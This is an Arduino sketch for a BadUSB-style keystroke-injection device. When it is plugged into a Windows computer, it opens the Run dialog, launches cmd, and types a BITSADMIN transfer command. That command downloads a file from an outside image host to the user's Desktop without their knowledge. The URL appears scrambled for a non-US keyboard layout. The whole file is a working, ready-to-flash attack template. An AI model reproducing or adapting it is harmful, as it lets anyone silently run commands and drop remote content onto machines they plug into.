#include <Keyboard.h>


void setup() {
  Keyboard.begin();
  
  runCmd();
  delay(1000);

  download();
  
  Keyboard.end();
}

void runCmd(){
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.press('r');
  
  delay(1000);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("cmd");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();
}
// http://galeri5.uludagsozluk.com/2/bereket-tanrisi_38451_m.jpg
void download(){
  Keyboard.print("BITSADMIN &transfer testJob &PRIORITY HIGH ");
  delay(500);
  Keyboard.print("HTTPS?&&I/Ibb/co&PDd3HTX&aa/jpg %cd%&Desktop&hello/jpg");
  delay(2000);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(4000);
  Keyboard.print("exIt");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}
void loop() {
  // put your main code here, to run repeatedly:

}
